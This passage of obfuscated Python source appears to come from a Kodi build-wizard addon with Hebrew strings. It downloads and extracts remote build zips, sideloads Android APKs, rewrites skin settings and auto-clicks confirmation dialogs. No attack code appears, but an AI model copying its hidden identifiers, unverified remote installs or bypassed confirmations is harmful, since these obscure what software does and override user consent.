			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3755
			OO0OOOOOOOO000OO0 =os .path .join (PACKAGES ,'%s.zip'%OOOO00O000O0000O0 )#line:3756
			try :os .remove (OO0OOOOOOOO000OO0 )#line:3757
			except :pass #line:3758
			downloader .download (OOOOO000O0O0OO0OO ,OO0OOOOOOOO000OO0 ,DP )#line:3759
			xbmc .sleep (1000 )#line:3760
			DP .update (0 ,"","Installing %s "%O0O000O00OO000OO0 )#line:3761
			OOO0OO0OO0O000000 =False #line:3762
			if url not in ["fresh","normal"]:#line:3763
				OOO0OO0OO0O000000 =testTheme (OO0OOOOOOOO000OO0 )if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.mediacenter.mod','skin.mediacenter.nox','skin.phenomenal','skin.Premium.mod']else False #line:3764
				OO00O000OOO0OO0OO =testGui (OO0OOOOOOOO000OO0 )if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.mediacenter.mod','skin.mediacenter.nox','skin.phenomenal','skin.Premium.mod']else False #line:3765
				if OOO0OO0OO0O000000 ==True :#line:3766
					wiz .lookandFeelData ('save')#line:3767
					OO0O0O00OO0OO00O0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.mediacenter.mod'if KODIV <17 else 'skin.myconfluence'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.mediacenter.nox'if KODIV <17 else 'skin.Premium.mod'#line:3768
					O000OOO0000O000O0 =xbmc .getSkinDir ()#line:3769
					skinSwitch .swapSkins (OO0O0O00OO0OO00O0 )#line:3771
					OO0OO00OOO0OO000O =0 #line:3772
					xbmc .sleep (1000 )#line:3773
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OO00OOO0OO000O <150 :#line:3774
						OO0OO00OOO0OO000O +=1 #line:3775
						xbmc .sleep (1000 )#line:3776
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3777
						wiz .ebi ('SendClick(11)')#line:3778
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3779
					xbmc .sleep (1000 )#line:3780
			OOO0000O0OO0O00OO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3781
			DP .update (0 ,OOO0000O0OO0O00OO ,'','אנא המתן')#line:3782
			OOO000O0OOOOOO0OO ,OOO0000O00O000OO0 ,OOO0000O00O0O0OO0 =extract .all (OO0OOOOOOOO000OO0 ,HOME ,DP ,title =OOO0000O0OO0O00OO )#line:3783
			wiz .setS ('buildtheme',theme )#line:3784
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOO000O0OOOOOO0OO ,OOO0000O00O000OO0 ))#line:3785
			DP .close ()#line:3786
			if url not in ["fresh","normal"]:#line:3787
				wiz .forceUpdate ()#line:3788
				if KODIV >=17 :wiz .kodi17Fix ()#line:3789
				if OO00O000OOO0OO0OO ==True :#line:3790
					wiz .lookandFeelData ('save')#line:3791
					wiz .defaultSkin ()#line:3792
					O000OOO0000O000O0 =wiz .getS ('defaultskin')#line:3793
					skinSwitch .swapSkins (O000OOO0000O000O0 )#line:3794
					OO0OO00OOO0OO000O =0 #line:3795
					xbmc .sleep (1000 )#line:3796
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OO00OOO0OO000O <150 :#line:3797
						OO0OO00OOO0OO000O +=1 #line:3798
						xbmc .sleep (1000 )#line:3799
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3801
						wiz .ebi ('SendClick(11)')#line:3802
					wiz .lookandFeelData ('restore')#line:3803
				elif OOO0OO0OO0O000000 ==True :#line:3804
					skinSwitch .swapSkins (O000OOO0000O000O0 )#line:3805
					OO0OO00OOO0OO000O =0 #line:3806
					xbmc .sleep (1000 )#line:3807
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OO00OOO0OO000O <150 :#line:3808
						OO0OO00OOO0OO000O +=1 #line:3809
						xbmc .sleep (1000 )#line:3810
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3812
						wiz .ebi ('SendClick(11)')#line:3813
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3814
					wiz .lookandFeelData ('restore')#line:3815
				else :#line:3816
					wiz .ebi ("ReloadSkin()")#line:3817
					xbmc .sleep (1000 )#line:3818
					wiz .ebi ("Container.Refresh")#line:3819
		else :#line:3820
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3821
def skin_homeselect ():#line:3825
	try :#line:3827
		O0O0OOOOO000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3828
		O0OO0OOO0O0000O0O =open (O0O0OOOOO000O000O ,'r')#line:3830
		O000O0O0O0O00OO0O =O0OO0OOO0O0000O0O .read ()#line:3831
		O0OO0OOO0O0000O0O .close ()#line:3832
		OO00O00O000O0O0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:3833
		OOOO00O00O000OO0O =re .compile (OO00O00O000O0O0O0 ).findall (O000O0O0O0O00OO0O )[0 ]#line:3834
		O0OO0OOO0O0000O0O =open (O0O0OOOOO000O000O ,'w')#line:3835
		O0OO0OOO0O0000O0O .write (O000O0O0O0O00OO0O .replace ('<setting id="HomeS" type="string%s/setting>'%OOOO00O00O000OO0O ,'<setting id="HomeS" type="string"></setting>'))#line:3836
		O0OO0OOO0O0000O0O .close ()#line:3837
	except :#line:3838
		pass #line:3839
def skin_lower ():#line:3842
	O0OO0000OOO00OOOO =(ADDON .getSetting ("lower"))#line:3843
	if O0OO0000OOO00OOOO =='true':#line:3844
		try :#line:3847
			O00OOO0O0000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3848
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'r')#line:3850
			O0OO000O0OOO000O0 =OOO0OO00O0OOOO0OO .read ()#line:3851
			OOO0OO00O0OOOO0OO .close ()#line:3852
			OO0OOOOOOOOOOO00O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3853
			OO0OO00O0OO00OO0O =re .compile (OO0OOOOOOOOOOO00O ).findall (O0OO000O0OOO000O0 )[0 ]#line:3854
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'w')#line:3855
			OOO0OO00O0OOOO0OO .write (O0OO000O0OOO000O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OO0OO00O0OO00OO0O ,'<setting id="none_widget" type="bool">true</setting>'))#line:3856
			OOO0OO00O0OOOO0OO .close ()#line:3857
			O00OOO0O0000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3859
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'r')#line:3861
			O0OO000O0OOO000O0 =OOO0OO00O0OOOO0OO .read ()#line:3862
			OOO0OO00O0OOOO0OO .close ()#line:3863
			OO0OOOOOOOOOOO00O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3864
			OO0OO00O0OO00OO0O =re .compile (OO0OOOOOOOOOOO00O ).findall (O0OO000O0OOO000O0 )[0 ]#line:3865
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'w')#line:3866
			OOO0OO00O0OOOO0OO .write (O0OO000O0OOO000O0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OO0OO00O0OO00OO0O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3867
			OOO0OO00O0OOOO0OO .close ()#line:3868
			O00OOO0O0000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3870
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'r')#line:3872
			O0OO000O0OOO000O0 =OOO0OO00O0OOOO0OO .read ()#line:3873
			OOO0OO00O0OOOO0OO .close ()#line:3874
			OO0OOOOOOOOOOO00O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:3875
			OO0OO00O0OO00OO0O =re .compile (OO0OOOOOOOOOOO00O ).findall (O0OO000O0OOO000O0 )[0 ]#line:3876
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'w')#line:3877
			OOO0OO00O0OOOO0OO .write (O0OO000O0OOO000O0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OO0OO00O0OO00OO0O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:3878
			OOO0OO00O0OOOO0OO .close ()#line:3879
			O00OOO0O0000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3883
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'r')#line:3885
			O0OO000O0OOO000O0 =OOO0OO00O0OOOO0OO .read ()#line:3886
			OOO0OO00O0OOOO0OO .close ()#line:3887
			OO0OOOOOOOOOOO00O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:3888
			OO0OO00O0OO00OO0O =re .compile (OO0OOOOOOOOOOO00O ).findall (O0OO000O0OOO000O0 )[0 ]#line:3889
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'w')#line:3890
			OOO0OO00O0OOOO0OO .write (O0OO000O0OOO000O0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OO0OO00O0OO00OO0O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:3891
			OOO0OO00O0OOOO0OO .close ()#line:3892
			O00OOO0O0000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3896
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'r')#line:3898
			O0OO000O0OOO000O0 =OOO0OO00O0OOOO0OO .read ()#line:3899
			OOO0OO00O0OOOO0OO .close ()#line:3900
			OO0OOOOOOOOOOO00O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:3901
			OO0OO00O0OO00OO0O =re .compile (OO0OOOOOOOOOOO00O ).findall (O0OO000O0OOO000O0 )[0 ]#line:3902
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'w')#line:3903
			OOO0OO00O0OOOO0OO .write (O0OO000O0OOO000O0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OO0OO00O0OO00OO0O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:3904
			OOO0OO00O0OOOO0OO .close ()#line:3905
			O00OOO0O0000O000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3909
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'r')#line:3911
			O0OO000O0OOO000O0 =OOO0OO00O0OOOO0OO .read ()#line:3912
			OOO0OO00O0OOOO0OO .close ()#line:3913
			OO0OOOOOOOOOOO00O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:3914
			OO0OO00O0OO00OO0O =re .compile (OO0OOOOOOOOOOO00O ).findall (O0OO000O0OOO000O0 )[0 ]#line:3915
			OOO0OO00O0OOOO0OO =open (O00OOO0O0000O000O ,'w')#line:3916
			OOO0OO00O0OOOO0OO .write (O0OO000O0OOO000O0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OO0OO00O0OO00OO0O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:3917
			OOO0OO00O0OOOO0OO .close ()#line:3918
		except :#line:3923
			pass #line:3924
def thirdPartyInstall (O00OO0OOO0000OOOO ,OOOOOO0OOOOOOO000 ):#line:3926
	if not wiz .workingURL (OOOOOO0OOOOOOO000 ):#line:3927
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:3928
	O000O0OOO0O0OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0OOO0000OOOO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:3929
	if O000O0OOO0O0OO00O ==1 :#line:3930
		freshStart ('third',True )#line:3931
	wiz .clearS ('build')#line:3932
	OO00O00OOO000OOO0 =O00OO0OOO0000OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3933
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3934
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OOO0000OOOO ),'','אנא המתן')#line:3935
	O0OO000000OO00OOO =os .path .join (PACKAGES ,'%s.zip'%OO00O00OOO000OOO0 )#line:3936
	try :os .remove (O0OO000000OO00OOO )#line:3937
	except :pass #line:3938
	downloader .download (OOOOOO0OOOOOOO000 ,O0OO000000OO00OOO ,DP )#line:3939
	xbmc .sleep (1000 )#line:3940
	OO0O0OOOOO0OOOO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OOO0000OOOO )#line:3941
	DP .update (0 ,OO0O0OOOOO0OOOO0O ,'','אנא המתן')#line:3942
	OOOOO0O0O00O00OO0 ,OOOOO0OO000OO0OOO ,OOO0O00OOOO00000O =extract .all (O0OO000000OO00OOO ,HOME ,DP ,title =OO0O0OOOOO0OOOO0O )#line:3943
	if int (float (OOOOO0O0O00O00OO0 ))>0 :#line:3944
		wiz .fixmetas ()#line:3945
		wiz .lookandFeelData ('save')#line:3946
		wiz .defaultSkin ()#line:3947
		wiz .setS ('installed','true')#line:3949
		wiz .setS ('extract',str (OOOOO0O0O00O00OO0 ))#line:3950
		wiz .setS ('errors',str (OOOOO0OO000OO0OOO ))#line:3951
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOOO0O0O00O00OO0 ,OOOOO0OO000OO0OOO ))#line:3952
		try :os .remove (O0OO000000OO00OOO )#line:3953
		except :pass #line:3954
		if int (float (OOOOO0OO000OO0OOO ))>0 :#line:3955
			O0000O00000O00O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OOO0000OOOO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOOO0O0O00O00OO0 ,'%',COLOR1 ,OOOOO0OO000OO0OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3956
			if O0000O00000O00O0O :#line:3957
				if isinstance (OOOOO0OO000OO0OOO ,unicode ):#line:3958
					OOO0O00OOOO00000O =OOO0O00OOOO00000O .encode ('utf-8')#line:3959
				wiz .TextBox (ADDONTITLE ,OOO0O00OOOO00000O )#line:3960
	DP .close ()#line:3961
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3962
	if INSTALLMETHOD ==1 :OO00OO00OOOO0OOOO =1 #line:3963
	elif INSTALLMETHOD ==2 :OO00OO00OOOO0OOOO =0 #line:3964
	else :OO00OO00OOOO0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:3965
	if OO00OO00OOOO0OOOO ==1 :wiz .reloadFix ()#line:3966
	else :wiz .killxbmc (True )#line:3967
def testTheme (OO00OO0O0O000O0O0 ):#line:3969
	O0OOO000OOOO0OO00 =zipfile .ZipFile (OO00OO0O0O000O0O0 )#line:3970
	for OO00OOO0OOOO000OO in O0OOO000OOOO0OO00 .infolist ():#line:3971
		if '/settings.xml'in OO00OOO0OOOO000OO .filename :#line:3972
			return True #line:3973
	return False #line:3974
def testGui (O00O0OO0OO0O0O000 ):#line:3976
	O00OOO0O00OO000O0 =zipfile .ZipFile (O00O0OO0OO0O0O000 )#line:3977
	for OOO0OO0000000OOOO in O00OOO0O00OO000O0 .infolist ():#line:3978
		if '/guisettings.xml'in OOO0OO0000000OOOO .filename :#line:3979
			return True #line:3980
	return False #line:3981
def apkInstaller (O00OO0O0O000O00O0 ,O000O00O000OO0O00 ):#line:3983
	wiz .log (O00OO0O0O000O00O0 )#line:3984
	wiz .log (O000O00O000OO0O00 )#line:3985
	if wiz .platform ()=='android':#line:3986
		O0000OOOOO0O0O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0O0O000O00O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3987
		if not O0000OOOOO0O0O00O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:3988
		O00O0OO0O00000OOO =O00OO0O0O000O00O0 #line:3989
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3990
		if not wiz .workingURL (O000O00O000OO0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:3991
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0OO0O00000OOO ),'','אנא המתן')#line:3992
		OO0000OOOOOO0OO0O =os .path .join (PACKAGES ,"%s.apk"%O00OO0O0O000O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:3993
		try :os .remove (OO0000OOOOOO0OO0O )#line:3994
		except :pass #line:3995
		downloader .download (O000O00O000OO0O00 ,OO0000OOOOOO0OO0O ,DP )#line:3996
		xbmc .sleep (100 )#line:3997
		DP .close ()#line:3998
		notify .apkInstaller (O00OO0O0O000O00O0 )#line:3999
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0000OOOOOO0OO0O +'")')#line:4000
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4001
def createMenu (O00OO0O00000OO0OO ,O0O0OO0O000O00O0O ,OO0OOOOOO00000OO0 ):#line:4007
	if O00OO0O00000OO0OO =='saveaddon':#line:4008
		O00OOO0O0O0O00OO0 =[]#line:4009
		OOO0O0O0O0O0O000O =urllib .quote_plus (O0O0OO0O000O00O0O .lower ().replace (' ',''))#line:4010
		O0O0OOOO0OO000OO0 =O0O0OO0O000O00O0O .replace ('Debrid','Real Debrid')#line:4011
		OO0OO000O000O000O =urllib .quote_plus (OO0OOOOOO00000OO0 .lower ().replace (' ',''))#line:4012
		OO0OOOOOO00000OO0 =OO0OOOOOO00000OO0 .replace ('url','URL Resolver')#line:4013
		O00OOO0O0O0O00OO0 .append ((THEME2 %OO0OOOOOO00000OO0 .title (),' '))#line:4014
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Save %s Data'%O0O0OOOO0OO000OO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO0O0O0O0O0O000O ,OO0OO000O000O000O )))#line:4015
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Restore %s Data'%O0O0OOOO0OO000OO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO0O0O0O0O0O000O ,OO0OO000O000O000O )))#line:4016
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Clear %s Data'%O0O0OOOO0OO000OO0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOO0O0O0O0O0O000O ,OO0OO000O000O000O )))#line:4017
	elif O00OO0O00000OO0OO =='save':#line:4018
		O00OOO0O0O0O00OO0 =[]#line:4019
		OOO0O0O0O0O0O000O =urllib .quote_plus (O0O0OO0O000O00O0O .lower ().replace (' ',''))#line:4020
		O0O0OOOO0OO000OO0 =O0O0OO0O000O00O0O .replace ('Debrid','Real Debrid')#line:4021
		OO0OO000O000O000O =urllib .quote_plus (OO0OOOOOO00000OO0 .lower ().replace (' ',''))#line:4022
		OO0OOOOOO00000OO0 =OO0OOOOOO00000OO0 .replace ('url','URL Resolver')#line:4023
		O00OOO0O0O0O00OO0 .append ((THEME2 %OO0OOOOOO00000OO0 .title (),' '))#line:4024
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Register %s'%O0O0OOOO0OO000OO0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOO0O0O0O0O0O000O ,OO0OO000O000O000O )))#line:4025
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Save %s Data'%O0O0OOOO0OO000OO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO0O0O0O0O0O000O ,OO0OO000O000O000O )))#line:4026
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Restore %s Data'%O0O0OOOO0OO000OO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO0O0O0O0O0O000O ,OO0OO000O000O000O )))#line:4027
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Import %s Data'%O0O0OOOO0OO000OO0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOO0O0O0O0O0O000O ,OO0OO000O000O000O )))#line:4028
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Clear Addon %s Data'%O0O0OOOO0OO000OO0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOO0O0O0O0O0O000O ,OO0OO000O000O000O )))#line:4029
	elif O00OO0O00000OO0OO =='install':#line:4030
		O00OOO0O0O0O00OO0 =[]#line:4031
		OO0OO000O000O000O =urllib .quote_plus (OO0OOOOOO00000OO0 )#line:4032
		O00OOO0O0O0O00OO0 .append ((THEME2 %OO0OOOOOO00000OO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO0OO000O000O000O )))#line:4033
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO0OO000O000O000O )))#line:4034
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO0OO000O000O000O )))#line:4035
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO0OO000O000O000O )))#line:4036
		O00OOO0O0O0O00OO0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO0OO000O000O000O )))#line:4037
	O00OOO0O0O0O00OO0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4038
	return O00OOO0O0O0O00OO0 #line:4039
def toggleCache (OOOOOO0000OOO0OO0 ):#line:4041
	O0OOOO0OOO0000000 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4042
	O0O0OOO0O0OO0O0O0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4043
	if OOOOOO0000OOO0OO0 in ['true','false']:#line:4044
		for O0O0O00OO00OO0OO0 in O0OOOO0OOO0000000 :#line:4045
			wiz .setS (O0O0O00OO00OO0OO0 ,OOOOOO0000OOO0OO0 )#line:4046
	else :#line:4047
		if not OOOOOO0000OOO0OO0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4048
			try :#line:4049
				O0O0O00OO00OO0OO0 =O0O0OOO0O0OO0O0O0 [O0OOOO0OOO0000000 .index (OOOOOO0000OOO0OO0 )]#line:4050
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0O0O00OO00OO0OO0 ))#line:4051
			except :#line:4052
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOOOOO0000OOO0OO0 ))#line:4053
		else :#line:4054
			OOO00OOOOO0O00O0O ='true'if wiz .getS (OOOOOO0000OOO0OO0 )=='false'else 'false'#line:4055
			wiz .setS (OOOOOO0000OOO0OO0 ,OOO00OOOOO0O00O0O )#line:4056
def playVideo (O000O0OOO0OO00OO0 ):#line:4058
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O000O0OOO0OO00OO0 )#line:4059
	if 'watch?v='in O000O0OOO0OO00OO0 :#line:4060
		O0OO0000O00OOOOOO ,O0O0OO0O0OOOOOO00 =O000O0OOO0OO00OO0 .split ('?')#line:4061
		O0O0O0O0OOO0OO0OO =O0O0OO0O0OOOOOO00 .split ('&')#line:4062
		for OOO000OOO000000O0 in O0O0O0O0OOO0OO0OO :#line:4063
			if OOO000OOO000000O0 .startswith ('v='):#line:4064
				O000O0OOO0OO00OO0 =OOO000OOO000000O0 [2 :]#line:4065
				break #line:4066
			else :continue #line:4067
	elif 'embed'in O000O0OOO0OO00OO0 or 'youtu.be'in O000O0OOO0OO00OO0 :#line:4068
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O000O0OOO0OO00OO0 )#line:4069
		O0OO0000O00OOOOOO =O000O0OOO0OO00OO0 .split ('/')#line:4070
		if len (O0OO0000O00OOOOOO [-1 ])>5 :#line:4071
			O000O0OOO0OO00OO0 =O0OO0000O00OOOOOO [-1 ]#line:4072
		elif len (O0OO0000O00OOOOOO [-2 ])>5 :#line:4073
			O000O0OOO0OO00OO0 =O0OO0000O00OOOOOO [-2 ]#line:4074
	wiz .log ("YouTube URL: %s"%O000O0OOO0OO00OO0 )#line:4075
	yt .PlayVideo (O000O0OOO0OO00OO0 )#line:4076
def viewLogFile ():#line:4078
	O0OO0000OOO000000 =wiz .Grab_Log (True )#line:4079
	O0000OOO00O0O0OO0 =wiz .Grab_Log (True ,True )#line:4080
	O000O00OO00O0OO0O =0 ;OO00OOOOOO0OOOO00 =O0OO0000OOO000000 #line:4081
	if not O0000OOO00O0O0OO0 ==False and not O0OO0000OOO000000 ==False :#line:4082
		O000O00OO00O0OO0O =DIALOG .select (ADDONTITLE ,["View %s"%O0OO0000OOO000000 .replace (LOG ,""),"View %s"%O0000OOO00O0O0OO0 .replace (LOG ,"")])#line:4083
		if O000O00OO00O0OO0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4084
	elif O0OO0000OOO000000 ==False and O0000OOO00O0O0OO0 ==False :#line:4085
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4086
		return #line:4087
	elif not O0OO0000OOO000000 ==False :O000O00OO00O0OO0O =0 #line:4088
	elif not O0000OOO00O0O0OO0 ==False :O000O00OO00O0OO0O =1 #line:4089
	OO00OOOOOO0OOOO00 =O0OO0000OOO000000 if O000O00OO00O0OO0O ==0 else O0000OOO00O0O0OO0 #line:4091
	OOOO0OO0OO00O000O =wiz .Grab_Log (False )if O000O00OO00O0OO0O ==0 else wiz .Grab_Log (False ,True )#line:4092
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO00OOOOOO0OOOO00 ),OOOO0OO0OO00O000O )#line:4094
def errorChecking (log =None ,count =None ,all =None ):#line:4096
	if log ==None :#line:4097
		O00O0O0000O0O0O0O =wiz .Grab_Log (True )#line:4098
		OOOO000OOOOO00O00 =wiz .Grab_Log (True ,True )#line:4099
		if not OOOO000OOOOO00O00 ==False and not O00O0O0000O0O0O0O ==False :#line:4100
